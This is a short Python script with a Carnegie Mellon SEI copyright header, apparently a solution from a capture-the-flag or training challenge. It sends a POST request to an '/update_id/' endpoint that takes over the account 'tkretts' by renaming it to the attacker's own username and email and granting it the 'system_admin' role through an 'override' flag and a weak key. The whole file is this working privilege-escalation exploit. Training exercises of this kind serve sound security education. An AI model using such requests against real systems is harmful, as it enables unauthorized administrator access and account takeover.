#!/usr/bin/python3

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


import requests, os, sys

def update_id():
    url = "http://canello.merch.codes/update_id/"
    data = {
        "old_username":"tkretts",
        "new_username":"**Your account username**",
        "email":"**your account email**",
        "role":"system_admin",
        "key":"test",
        "override":"yes"
    }

    try:
        resp = requests.post(url,data=data)
    except Exception as e:
        print(str(e))
    else:
        print(resp.text)

if __name__ == "__main__":
    update_id()
